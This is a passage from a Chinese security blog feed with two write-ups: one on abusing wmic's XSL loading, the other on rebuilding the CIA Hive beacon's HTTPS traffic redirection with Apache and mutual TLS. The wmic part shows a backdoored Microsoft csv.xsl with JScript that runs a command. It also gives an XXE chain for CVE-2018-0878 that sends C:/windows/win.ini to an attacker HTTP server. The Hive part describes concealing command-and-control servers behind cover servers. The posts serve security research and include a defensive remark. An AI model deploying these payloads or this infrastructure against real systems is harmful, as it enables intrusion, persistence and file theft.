test=&quot;position()!=last()&quot;&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;xsl:apply-templates select=&quot;COMMAND/RESULTS&quot;/&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;RESULTS&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:apply-templates select=&quot;CIM/INSTANCE&quot;/&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;VALUE.ARRAY&quot; xml:space=&quot;preserve&quot;&gt;{&lt;xsl:for-each select=&quot;VALUE&quot;&gt;&lt;xsl:apply-templates select=&quot;.&quot;/&gt;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;}&lt;/xsl:template&gt;&lt;xsl:template match=&quot;VALUE&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:value-of select=&quot;.&quot;/&gt;&lt;/xsl:template&gt;&lt;xsl:template match=&quot;INSTANCE&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:value-of select=&quot;../../@NODE&quot;/&gt;,&lt;xsl:for-each select=&quot;PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE&quot;&gt;&lt;xsl:apply-templates select=&quot;.&quot;/&gt;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;PROPERTY.REFERENCE&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:apply-templates select=&quot;VALUE.REFERENCE&quot;&gt;&lt;/xsl:apply-templates&gt;&lt;/xsl:template&gt;&lt;xsl:template match=&quot;PROPERTY&quot;&gt;&lt;xsl:apply-templates select=&quot;VALUE&quot;/&gt;&lt;/xsl:template&gt;&lt;xsl:template match=&quot;PROPERTY.ARRAY&quot;&gt;&lt;xsl:for-each select=&quot;VALUE.ARRAY&quot;&gt;&lt;xsl:apply-templates select=&quot;.&quot;/&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt;&lt;xsl:template match=&quot;VALUE.REFERENCE&quot;&gt;&quot;&lt;xsl:apply-templates select=&quot;INSTANCEPATH/NAMESPACEPATH&quot;/&gt;&lt;xsl:apply-templates select=&quot;INSTANCEPATH/INSTANCENAME|INSTANCENAME&quot;/&gt;&quot;&lt;/xsl:template&gt;&lt;xsl:template match=&quot;NAMESPACEPATH&quot;&gt;\\&lt;xsl:value-of select=&quot;HOST/text()&quot;/&gt;&lt;xsl:for-each select=&quot;LOCALNAMESPACEPATH/NAMESPACE&quot;&gt;\&lt;xsl:value-of select=&quot;@NAME&quot;/&gt;&lt;/xsl:for-each&gt;:&lt;/xsl:template&gt;&lt;xsl:template match=&quot;INSTANCENAME&quot;&gt;&lt;xsl:value-of select=&quot;@CLASSNAME&quot;/&gt;&lt;xsl:for-each select=&quot;KEYBINDING&quot;&gt;&lt;xsl:if test=&quot;position()=1&quot;&gt;.&lt;/xsl:if&gt;&lt;xsl:value-of select=&quot;@NAME&quot;/&gt;=&quot;&lt;xsl:value-of select=&quot;KEYVALUE/text()&quot;/&gt;&quot;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;&lt;/xsl:if&gt;&lt;xsl:if test=&quot;not($norefcomma=&amp;quot;true&amp;quot;)&quot;&gt;,&lt;/xsl:if&gt;&lt;xsl:if test=&quot;$norefcomma=&amp;quot;true&amp;quot;&quot;&gt;&lt;xsl:text&gt; &lt;/xsl:text&gt;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;</code></pre><p>尝试在代码中添加payload，修改后的内容如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!-- Copyright (c) Microsoft Corporation.  All rights reserved. --&gt;&lt;xsl:stylesheet version=&quot;1.0&quot;      xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;      xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;      xmlns:user=&quot;urn:my-scripts&quot;&gt;&lt;xsl:output encoding=&quot;utf-16&quot; omit-xml-declaration=&quot;yes&quot;/&gt;&lt;xsl:param name=&quot;norefcomma&quot;/&gt;&lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;   function myFunction() {    var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);          return &quot;&quot;;         }&lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt;&lt;xsl:value-of select=&quot;user:myFunction()&quot;/&gt;Node,&lt;xsl:for-each select=&quot;COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.ARRAY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.REFERENCE&quot;&gt;&lt;xsl:value-of select=&quot;@NAME&quot;/&gt;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;xsl:apply-templates select=&quot;COMMAND/RESULTS&quot;/&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;RESULTS&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:apply-templates select=&quot;CIM/INSTANCE&quot;/&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;VALUE.ARRAY&quot; xml:space=&quot;preserve&quot;&gt;{&lt;xsl:for-each select=&quot;VALUE&quot;&gt;&lt;xsl:apply-templates select=&quot;.&quot;/&gt;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;}&lt;/xsl:template&gt;&lt;xsl:template match=&quot;VALUE&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:value-of select=&quot;.&quot;/&gt;&lt;/xsl:template&gt;&lt;xsl:template match=&quot;INSTANCE&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:value-of select=&quot;../../@NODE&quot;/&gt;,&lt;xsl:for-each select=&quot;PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE&quot;&gt;&lt;xsl:apply-templates select=&quot;.&quot;/&gt;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt; &lt;xsl:template match=&quot;PROPERTY.REFERENCE&quot; xml:space=&quot;preserve&quot;&gt;&lt;xsl:apply-templates select=&quot;VALUE.REFERENCE&quot;&gt;&lt;/xsl:apply-templates&gt;&lt;/xsl:template&gt;&lt;xsl:template match=&quot;PROPERTY&quot;&gt;&lt;xsl:apply-templates select=&quot;VALUE&quot;/&gt;&lt;/xsl:template&gt;&lt;xsl:template match=&quot;PROPERTY.ARRAY&quot;&gt;&lt;xsl:for-each select=&quot;VALUE.ARRAY&quot;&gt;&lt;xsl:apply-templates select=&quot;.&quot;/&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt;&lt;xsl:template match=&quot;VALUE.REFERENCE&quot;&gt;&quot;&lt;xsl:apply-templates select=&quot;INSTANCEPATH/NAMESPACEPATH&quot;/&gt;&lt;xsl:apply-templates select=&quot;INSTANCEPATH/INSTANCENAME|INSTANCENAME&quot;/&gt;&quot;&lt;/xsl:template&gt;&lt;xsl:template match=&quot;NAMESPACEPATH&quot;&gt;\\&lt;xsl:value-of select=&quot;HOST/text()&quot;/&gt;&lt;xsl:for-each select=&quot;LOCALNAMESPACEPATH/NAMESPACE&quot;&gt;\&lt;xsl:value-of select=&quot;@NAME&quot;/&gt;&lt;/xsl:for-each&gt;:&lt;/xsl:template&gt;&lt;xsl:template match=&quot;INSTANCENAME&quot;&gt;&lt;xsl:value-of select=&quot;@CLASSNAME&quot;/&gt;&lt;xsl:for-each select=&quot;KEYBINDING&quot;&gt;&lt;xsl:if test=&quot;position()=1&quot;&gt;.&lt;/xsl:if&gt;&lt;xsl:value-of select=&quot;@NAME&quot;/&gt;=&quot;&lt;xsl:value-of select=&quot;KEYVALUE/text()&quot;/&gt;&quot;&lt;xsl:if test=&quot;position()!=last()&quot;&gt;&lt;/xsl:if&gt;&lt;xsl:if test=&quot;not($norefcomma=&amp;quot;true&amp;quot;)&quot;&gt;,&lt;/xsl:if&gt;&lt;xsl:if test=&quot;$norefcomma=&amp;quot;true&amp;quot;&quot;&gt;&lt;xsl:text&gt; &lt;/xsl:text&gt;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;</code></pre><p>替换原文件，需要管理员权限</p><p><strong>注：</strong></p><p>csv.xsl的路径同系统语言版本有关，如果是英文系统，路径为<code>C:\Windows\System32\wbem\en-US</code>，如果是中文系统，路径为<code>C:\Windows\System32\wbem\zh-CN</code></p><p>测试使用wmic的输出格式命令：</p><pre><code>wmic os get /format:csv</code></pre><p>执行payload，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-23/2-2.png" alt="Alt text"></p><h2 id="0x05-同XXE漏洞的结合"><a href="#0x05-同XXE漏洞的结合" class="headerlink" title="0x05 同XXE漏洞的结合"></a>0x05 同XXE漏洞的结合</h2><hr><p>XXE是XML External Entity attack的缩写</p><p>前不久一个和Windows相关的XXE漏洞：CVE-2018-0878</p><p>poc地址如下：</p><p><a href="https://www.exploit-db.com/exploits/44352/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44352/</a></p><p>同样可在wmic命令上触发</p><h3 id="漏洞测试："><a href="#漏洞测试：" class="headerlink" title="漏洞测试："></a>漏洞测试：</h3><h4 id="1、使用kali-linux建立httt服务器"><a href="#1、使用kali-linux建立httt服务器" class="headerlink" title="1、使用kali linux建立httt服务器"></a>1、使用kali linux建立httt服务器</h4><pre><code>python -m SimpleHTTPServer 8080</code></pre><h4 id="2、kali-linux目录下创建文件xxe-xml"><a href="#2、kali-linux目录下创建文件xxe-xml" class="headerlink" title="2、kali linux目录下创建文件xxe.xml"></a>2、kali linux目录下创建文件xxe.xml</h4><p>内容如下：</p><pre><code>&lt;!ENTITY % payload SYSTEM &quot;file:///C:/windows/win.ini&quot;&gt;  &lt;!ENTITY % root &quot;&lt;!ENTITY &amp;#37; oob SYSTEM &#39;http://192.168.62.140:8080/?%payload;&#39;&gt; &quot;&gt;  </code></pre><p><strong>注：</strong></p><p>kali linux的IP为192.168.62.140</p><h4 id="3、创建payload-xsl"><a href="#3、创建payload-xsl" class="headerlink" title="3、创建payload.xsl"></a>3、创建payload.xsl</h4><p>内容如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;  &lt;!DOCTYPE zsl [  &lt;!ENTITY % remote SYSTEM &quot;http://192.168.62.140:8080/xxe.xml&quot;&gt;  %remote;%root;%oob;]&gt;</code></pre><h4 id="4、windows系统使用wmic加载该xsl文件"><a href="#4、windows系统使用wmic加载该xsl文件" class="headerlink" title="4、windows系统使用wmic加载该xsl文件"></a>4、windows系统使用wmic加载该xsl文件</h4><pre><code>wmic os get /format:payload.xsl</code></pre><p>执行失败，提示<code>Invalid XSL format (or) file name.</code></p><p>然而，漏洞成功触发，服务器获得文件<code>C:/windows/win.ini</code>的内容，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-23/3-1.png" alt="Alt text"></p><h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><hr><p>本文测试了使用wmic从本地或从URL调用XSL文件的方法，分享了一个后门利用的思路，并结合CVE-2018-0878对XXE漏洞进行了测试。<br>站在防御的角度，如果wmic.exe发起了网络连接，那么很有可能是加载了特殊xsl文件的原因，值得注意。</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CIA Hive Beacon Infrastructure复现2——使用Apache mod_rewrite实现https流量分发</title>
    <link href="wiki.cfyqy.com/posts/3e9d700d.html"/>
    <id>wiki.cfyqy.com/posts/3e9d700d.html</id>
    <published>2018-05-25T13:03:44.927Z</published>
    <updated>2018-05-25T13:04:28.163Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>上篇文章介绍了使用Apache的mod_rewrite模块来实现http流量分发，本文将在此基础上介绍https的流量分发，对客户端的证书进行判断，若证书有效，才会将流量转发至真实服务器。</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>Windows系统下配置Apache开启ssl</li><li>Ubuntu系统下配置Apache开启ssl</li><li>使用openssl生成证书的方法和难点</li><li>Apache Https双向认证的配置</li><li>实现https流量分发的过程</li></ul><h2 id="0x02-Windows系统下配置Apache开启ssl"><a href="#0x02-Windows系统下配置Apache开启ssl" class="headerlink" title="0x02 Windows系统下配置Apache开启ssl"></a>0x02 Windows系统下配置Apache开启ssl</h2><hr><h3 id="1、下载包含openssl的Apache"><a href="#1、下载包含openssl的Apache" class="headerlink" title="1、下载包含openssl的Apache"></a>1、下载包含openssl的Apache</h3><p>地址：</p><p><a href="http://httpd.apache.org/download.cgi" target="_blank" rel="noopener">http://httpd.apache.org/download.cgi</a></p><p>选择需要的版本，测试版本Apache 2.4.33，下载地址：</p><p><a href="https://www.apachehaus.com/cgi-bin/download.plx?dli=wUWZ1allWW00kej9iUG5UeJVlUGRVYRdnWzQmW" target="_blank" rel="noopener">https://www.apachehaus.com/cgi-bin/download.plx?dli=wUWZ1allWW00kej9iUG5UeJVlUGRVYRdnWzQmW</a></p><h3 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h3><p>解压后通过命令行安装：</p><pre><code>cd \Apace24\binhttpd -k install</code></pre><h3 id="3、配置httpd-conf"><a href="#3、配置httpd-conf" class="headerlink" title="3、配置httpd.conf"></a>3、配置httpd.conf</h3><p>位于<code>\Apace24\conf\httpd.conf</code></p><h4 id="1"><a href="#1" class="headerlink" title="(1)"></a>(1)</h4><p>定位：</p><pre><code>#LoadModule ssl_module modules/mod_ssl.so </code></pre><p>去掉#</p><h4 id="2"><a href="#2" class="headerlink" title="(2)"></a>(2)</h4><p>定位：</p><pre><code>&lt;IfModule ssl_module&gt;Include conf/extra/httpd-ahssl.confSSLRandomSeed startup builtinSSLRandomSeed connect builtin&lt;/IfModule&gt;</code></pre><p>将<code>Include conf/extra/httpd-ahssl.conf</code>改为<code>Include conf/extra/httpd-ssl.conf</code></p><p><strong>注：</strong></p><p>httpd-ahssl.conf是Apache自带的ssl配置，默认生成了可用的私钥和证书(位于<code>\Apace24\conf\ssl</code>)，也可以直接修改httpd-ahssl.conf进行配置</p><h3 id="4、配置httpd-ssl-conf"><a href="#4、配置httpd-ssl-conf" class="headerlink" title="4、配置httpd-ssl.conf"></a>4、配置httpd-ssl.conf</h3><p>位于<code>\Apache24\conf\extra\httpd-ssl.conf</code></p><h4 id="1-1"><a href="#1-1" class="headerlink" title="(1)"></a>(1)</h4><p>定位：</p><pre><code>&lt;VirtualHost _default_:443&gt;#   General setup for the virtual hostDocumentRoot &quot;${SRVROOT}/htdocs&quot;ServerName www.example.com:443</code></pre><p>修改为：</p><pre><code>&lt;VirtualHost _default_:443&gt;#   General setup for the virtual hostDocumentRoot &quot;${SRVROOT}/htdocs&quot;ServerName test.com:443</code></pre><h4 id="2-1"><a href="#2-1" class="headerlink" title="(2)"></a>(2)</h4><p>定位：</p><pre><code>SSLCertificateFile &quot;${SRVROOT}/conf/server.crt&quot;</code></pre><p>修改为自己证书文件的路径(后面会介绍生成方法)</p><h4 id="3"><a href="#3" class="headerlink" title="(3)"></a>(3)</h4><p>定位：</p><pre><code>SSLCertificateKeyFile &quot;${SRVROOT}/conf/server.key&quot;</code></pre><p>修改为自己私钥文件的路径(后面会介绍生成方法)</p><h3 id="5、重启apache"><a href="#5、重启apache" class="headerlink" title="5、重启apache"></a>5、重启apache</h3><pre><code>httpd.exe -k restart</code></pre><h2 id="0x03-Ubuntu系统下配置Apache开启ssl"><a href="#0x03-Ubuntu系统下配置Apache开启ssl" class="headerlink" title="0x03 Ubuntu系统下配置Apache开启ssl"></a>0x03 Ubuntu系统下配置Apache开启ssl</h2><hr><h3 id="1、安装apache"><a href="#1、安装apache" class="headerlink" title="1、安装apache"></a>1、安装apache</h3><pre><code>sudo apt-get install apache2</code></pre><h3 id="2、安装openssl"><a href="#2、安装openssl" class="headerlink" title="2、安装openssl"></a>2、安装openssl</h3><pre><code>sudo apt-get install openssl</code></pre><h3 id="3、开启Apache-SSL模块"><a href="#3、开启Apache-SSL模块" class="headerlink" title="3、开启Apache SSL模块"></a>3、开启Apache SSL模块</h3><pre><code>a2enmod ssl</code></pre><h3 id="4、编辑文件-etc-apache2-sites-enabled-default-ssl-conf"><a href="#4、编辑文件-etc-apache2-sites-enabled-default-ssl-conf" class="headerlink" title="4、编辑文件/etc/apache2/sites-enabled/default-ssl.conf"></a>4、编辑文件<code>/etc/apache2/sites-enabled/default-ssl.conf</code></h3><p>指定私钥文件和签名证书的路径</p><pre><code>SSLEngine onSSLCertificateFile /etc/apache2/ssl/test.com.crtSSLCertificateKeyFile /etc/apache2/ssl/test.com.key</code></pre><h3 id="5、启用Apache默认的SSL虚拟主机"><a href="#5、启用Apache默认的SSL虚拟主机" class="headerlink" title="5、启用Apache默认的SSL虚拟主机"></a>5、启用Apache默认的SSL虚拟主机</h3><pre><code>a2ensite default-ssl</code></pre><h3 id="6、重启Apache"><a href="#6、重启Apache" class="headerlink" title="6、重启Apache:"></a>6、重启Apache:</h3><pre><code>sudo /etc/init.d/apache2 restart</code></pre><h2 id="0x04-生成SSL证书的流程"><a href="#0x04-生成SSL证书的流程" class="headerlink" title="0x04 生成SSL证书的流程"></a>0x04 生成SSL证书的流程</h2><hr><h3 id="1、客户端生成一对公钥和私钥-key文件"><a href="#1、客户端生成一对公钥和私钥-key文件" class="headerlink" title="1、客户端生成一对公钥和私钥(.key文件)"></a>1、客户端生成一对公钥和私钥(.key文件)</h3><h3 id="2、客户端生成证书请求文件-csr文件"><a href="#2、客户端生成证书请求文件-csr文件" class="headerlink" title="2、客户端生成证书请求文件(.csr文件)"></a>2、客户端生成证书请求文件(.csr文件)</h3><p>将csr文件发送给CA机构进行校验，若审核通过，CA机构使用自己的私钥对csr文件进行签名，生成证书文件(.crt文件),发给用户，用户使用该证书证明自己的身份</p><p>生成方法：</p><p>输入：</p><ul><li>用户私钥</li><li>用户信息</li></ul><p>输出：</p><p>csr文件，包括用户公钥和用户信息</p><h3 id="3、CA审核请求，生成证书文件-crt"><a href="#3、CA审核请求，生成证书文件-crt" class="headerlink" title="3、CA审核请求，生成证书文件(.crt)"></a>3、CA审核请求，生成证书文件(.crt)</h3><p>一般是将csr文件发送到证书签发机构CA进行校验，但是我们可以自己对其审核，生成一个自签名证书(可用于测试，无法保证可信)</p><h2 id="0x05-使用openssl生成SSL证书"><a href="#0x05-使用openssl生成SSL证书" class="headerlink" title="0x05 使用openssl生成SSL证书"></a>0x05 使用openssl生成SSL证书</h2><hr><p>Ubuntu安装openssl后可直接运行openssl</p><p>Windows安装Apache后默认安装openssl，位于<code>\Apache24\bin</code></p><h3 id="1、常规方法："><a href="#1、常规方法：" class="headerlink" title="1、常规方法："></a>1、常规方法：</h3><h4 id="1-生成2048位的加密私钥"><a href="#1-生成2048位的加密私钥" class="headerlink" title="(1) 生成2048位的加密私钥"></a>(1) 生成2048位的加密私钥</h4><pre><code>openssl genrsa -out server.key 2048</code></pre><h4 id="2-生成证书签名请求"><a href="#2-生成证书签名请求" class="headerlink" title="(2) 生成证书签名请求"></a>(2) 生成证书签名请求</h4><pre><code>openssl req -new -key server.key -out server.csr</code></pre><p>接着依次填入配置信息，<code>Common Name</code>项要同域名对应(测试域名为test.com)</p><h4 id="3-生成自签名证书"><a href="#3-生成自签名证书" class="headerlink" title="(3) 生成自签名证书"></a>(3) 生成自签名证书</h4><pre><code>openssl x509 -req -days 3650 -in server.csr -signkey server.key -out server.crt</code></pre><h3 id="2、快捷方法："><a href="#2、快捷方法：" class="headerlink" title="2、快捷方法："></a>2、快捷方法：</h3><p>通过网站自动生成openssl配置参数，地址如下：</p><p><a href="https://myssl.com/csr_create.html" target="_blank" rel="noopener">https://myssl.com/csr_create.html</a></p><p>填入配置信息后自动生成openssl参数，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-18/2-1.png" alt="Alt text"></p><p>参数如下：</p><pre><code>openssl req -new -SHA256 -newkey rsa:2048 -nodes -keyout test.com.key -out test.com.csr -subj &quot;/C=CN/ST=Shanghai/L=Shanghai/O=11/OU=22/CN=test.com&quot;</code></pre><p>生成私钥文件test.com.key和证书签名请求test.com.csr</p><p>接着生成自签名证书：</p><pre><code>openssl x509 -req -days 3650 -in test.com.csr -signkey test.com.key -out test.com.crt</code></pre><p><strong>实际测试：</strong></p><h4 id="1-修改apache服务器的ssl配置"><a href="#1-修改apache服务器的ssl配置" class="headerlink" title="(1) 修改apache服务器的ssl配置"></a>(1) 修改apache服务器的ssl配置</h4><p>SSLCertificateFile指向自签名证书(.crt文件)路径</p><p>SSLCertificateKeyFile指向私钥文件(.key文件)路径</p><p>重启apache服务</p><h4 id="2-客户端修改hosts文件："><a href="#2-客户端修改hosts文件：" class="headerlink" title="(2) 客户端修改hosts文件："></a>(2) 客户端修改hosts文件：</h4><p>apache服务器ip对应test.com</p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-18/2-2.png" alt="Alt text"></p><h4 id="3-客户端将自签名证书安装到受信任的根证书颁发机构"><a href="#3-客户端将自签名证书安装到受信任的根证书颁发机构" class="headerlink" title="(3) 客户端将自签名证书安装到受信任的根证书颁发机构"></a>(3) 客户端将自签名证书安装到<code>受信任的根证书颁发机构</code></h4><p>安装后如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-18/2-3.png" alt="Alt text"></p><h4 id="4-客户端访问Apache服务器"><a href="#4-客户端访问Apache服务器" class="headerlink" title="(4) 客户端访问Apache服务器"></a>(4) 客户端访问Apache服务器</h4><p>访问失败，提示<code>它的安全证书没有指定主题备用名称</code>，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-18/2-4.png" alt="Alt text"></p><p>常规方法和快捷方法生成的证书均存在这个问题</p><h3 id="3、解决方法"><a href="#3、解决方法" class="headerlink" title="3、解决方法"></a>3、解决方法</h3><p>证书缺少主题备用名称SAN (Subject Alternate Name)，需要通过配置文件进行添加</p><p>参考资料：</p><p><a href="https://support.citrix.com/article/CTX135602" target="_blank" rel="noopener">https://support.citrix.com/article/CTX135602</a>_</p><p>新建文件req.cnf，内容如下：</p><pre><code>[req]distinguished_name = req_distinguished_namex509_extensions = v3_reqprompt = no[req_distinguished_name]C = USST = VAL = SomeCityO = MyCompanyOU = MyDivisionCN = test.com[v3_req]keyUsage = critical, digitalSignature, keyAgreementextendedKeyUsage = serverAuthsubjectAltName = @alt_names[alt_names]DNS.1 = test.com</code></pre><p><strong>注：</strong></p><p>CN和DNS.1都需要设定为域名(测试域名为test.com)</p><p>生成私钥和自签名证书：</p><pre><code>openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout test.com.key -out test.com.crt -config req.cnf -sha256</code></pre><p>修改apache服务器的ssl配置,指定新的私钥文件(test.com.key)和证书文件(test.com.crt)，重启apache服务</p><p>客户端安装自签名证书文件test.com.crt</p><p>访问Apache服务器，证书有效，一切正常，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-18/2-5.png" alt="Alt text"></p><p><strong>补充：</strong></p><p>在未来，openssl有可能支持设置参数<code>DNS.1</code>，相关资料：</p><p><a href="https://github.com/openssl/openssl/pull/4986" target="_blank" rel="noopener">https://github.com/openssl/openssl/pull/4986</a></p><h2 id="0x06-规则配置实现https流量分发"><a href="#0x06-规则配置实现https流量分发" class="headerlink" title="0x06 规则配置实现https流量分发"></a>0x06 规则配置实现https流量分发</h2><hr><h3 id="1、开启双向认证"><a href="#1、开启双向认证" class="headerlink" title="1、开启双向认证"></a>1、开启双向认证</h3><p>服务器验证客户端证书，如果客户端证书有效，客户端才能正常访问网页，否则无法访问</p><h4 id="1-Windows系统"><a href="#1-Windows系统" class="headerlink" title="(1) Windows系统"></a>(1) Windows系统</h4><p><strong>1.生成客户端证书</strong></p><pre><code>openssl req -new -SHA256 -newkey rsa:2048 -nodes -keyout user.key -out user.csr -subj &quot;/C=CN/ST=Shanghai/L=Shanghai/O=11/OU=22/CN=user&quot;openssl x509 -req -days 365 -in user.csr -signkey user.key -out user.crtopenssl pkcs12 -export -cacerts -inkey user.key -in user.crt -out user.p12</code></pre><p><strong>2.服务器编辑文件<code>\Apache24\conf\extra\httpd-ssl.conf</code></strong></p><p>添加客户端证书的路径，指向user.crt</p><pre><code>SSLEngine onSSLCertificateFile &quot;${SRVROOT}/conf/test.com.crt&quot;SSLCertificateKeyFile &quot;${SRVROOT}/conf/test.com.key&quot;SSLCACertificateFile &quot;${SRVROOT}/conf/user.crt&quot;</code></pre><p>开启客户端认证：</p><pre><code>SSLVerifyClient require  SSLVerifyDepth  10 </code></pre><p><strong>3.重启Apache</strong></p><pre><code>httpd.exe -k restart</code></pre><p><strong>4.客户端安装证书user.p12</strong></p><p>访问网页时弹框提示，确认证书后正常访问，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-18/3-1.png" alt="Alt text"></p><h4 id="2-Ubuntu系统"><a href="#2-Ubuntu系统" class="headerlink" title="(2) Ubuntu系统"></a>(2) Ubuntu系统</h4><p><strong>1.生成客户端证书</strong></p><pre><code>openssl req -new -SHA256 -newkey rsa:2048 -nodes -keyout user.key -out user.csr -subj &quot;/C=CN/ST=Shanghai/L=Shanghai/O=11/OU=22/CN=user&quot;openssl x509 -req -days 365 -in user.csr -signkey user.key -out user.crtopenssl pkcs12 -export -cacerts -inkey user.key -in user.crt -out user.p12</code></pre><p><strong>2.服务器编辑文件<code>/etc/apache2/sites-enabled/default-ssl.conf</code></strong></p><p>指定私钥文件、签名证书和客户端证书的路径</p><pre><code>SSLEngine onSSLCertificateFile /etc/apache2/ssl/test.com.crtSSLCertificateKeyFile /etc/apache2/ssl/test.com.keySSLCACertificateKeyFile /etc/apache2/ssl/user.crt</code></pre><p>开启客户端认证：</p><pre><code>SSLVerifyClient require  SSLVerifyDepth  10 </code></pre><p><strong>3.重启Apache</strong></p><pre><code>sudo /etc/init.d/apache2 restart</code></pre><p><strong>4.客户端安装证书user.p12</strong></p><p>正常访问</p><h3 id="2、流量转发"><a href="#2、流量转发" class="headerlink" title="2、流量转发"></a>2、流量转发</h3><p>配置方法参照上篇文章，本文不再赘述</p><p>最终能实现对Https的流量进行判断，如果证书有效，转发到真实服务器</p><p>如果证书无效，可选择转发到Cover Server或是不提供服务</p><h2 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h2><hr><p>本文介绍了Windows系统和Ubuntu系统下配置Apache https的方法，分享SSL证书生成方法和配置过程，在技术研究的角度实现了对Https的流量判断，根据条件进行https流量的分发。</p><p>至此，成功实现Hive的流量分发功能。</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CIA Hive Beacon Infrastructure复现1——使用Apache mod_rewrite实现http流量分发</title>
    <link href="wiki.cfyqy.com/posts/1d97e66e.html"/>
    <id>wiki.cfyqy.com/posts/1d97e66e.html</id>
    <published>2018-05-25T13:03:44.925Z</published>
    <updated>2018-05-25T13:04:28.163Z</updated>
    
